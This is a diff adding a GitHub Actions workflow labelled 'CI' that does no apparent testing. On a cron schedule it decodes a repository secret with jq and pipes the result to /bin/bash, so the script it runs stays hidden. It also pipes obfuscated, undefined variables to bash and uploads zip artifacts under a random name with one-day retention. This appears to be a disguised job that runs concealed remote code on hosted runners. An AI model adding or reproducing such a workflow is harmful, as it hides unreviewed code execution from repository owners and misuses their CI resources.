@@ -1,0 +1,32 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '25 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run task
+        env:
+          pv0: ${{ secrets.pv0 }}
+        run: |
+          printf '%s' "$pv0" | jq -r .coe97794 | /bin/bash
+          echo $byn697 | jq -r .wa15 | /bin/bash
+          echo $yrf74456 | jq -r .inz41 | /bin/bash
+          echo $cqvp7512 | jq -r .k53133 | /bin/bash
+
+      - name: Store output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 2SmvwxKT
+          path: "*.zip"
+          retention-days: 1
